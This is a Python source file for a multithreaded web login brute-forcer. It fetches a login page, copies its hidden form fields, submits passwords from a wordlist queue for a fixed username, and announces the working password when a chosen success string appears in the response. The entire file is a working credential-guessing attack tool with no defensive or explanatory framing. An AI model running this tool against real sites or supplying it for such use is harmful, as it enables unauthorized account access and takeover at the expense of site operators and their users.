import threading
import http.cookiejar
import urllib.request
from html.parser import HTMLParser

class Bruter(object):
    def __init__(self, user_name, words, user_thread, target_url, target_post, success_check):
        # user name
        self.user_name     = user_name
        # password list (queue)
        self.password_q    = words
        # found flag
        self.found         = False
        # thread count
        self.user_thread   = user_thread
        # login form URL
        self.target_url    = target_url
        # URL for a bruteforce attack
        self.target_post   = target_post
        # The attack is considered successful if the http response contains success_check text.
        self.success_check = success_check

    def run_bruteforce(self):
        for i in range(self.user_thread):
            t = threading.Thread(target=self.web_bruter)
            t.start()

    def _web_bruter(self, password):
        jar   = http.cookiejar.FileCookieJar(filename = "cookies")
        opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(jar))

        response = opener.open(self.target_url)

        page = response.read().decode("utf-8")

        print("Trying: %s : %s (%d left)" % (self.user_name, password, self.password_q.qsize()))
        # Parse the hidden field.
        parser = BruteParser()
        parser.feed(page)

        post_tags = parser.tag_results

        post_tags["username"] = self.user_name
        post_tags["password"]   = password

        login_data = urllib.parse.urlencode(post_tags)
        login_response = opener.open(self.target_post, login_data.encode("utf-8"))

        login_result = login_response.read().decode("utf-8")

        if self.success_check in login_result:
            self.found = True
            print("[*] Bruteforce successful: Username: %s, Password: %s" % (self.user_name, password))

    def web_bruter(self):
        while not self.attack_completed():
            password = self.password_q.get().rstrip()
            self._web_bruter(password)

    def attack_completed(self):
        return self.password_q.empty() or self.found

# The BruteParser collects the name and value attribute for the input tag.
class BruteParser(HTMLParser):
    def __init__(self):
        HTMLParser.__init__(self)
        self.tag_results = {}

    def handle_starttag(self, tag, attrs):
        if tag == "input": # <input> tag.
            tag_name = None
            tag_value = None
            for name, value in attrs:
                if name == "name":
                    tag_name = value
                if name == "value":
                    tag_value = value
            if tag_name is not None:
                self.tag_results[tag_name] = tag_value
            
            
            
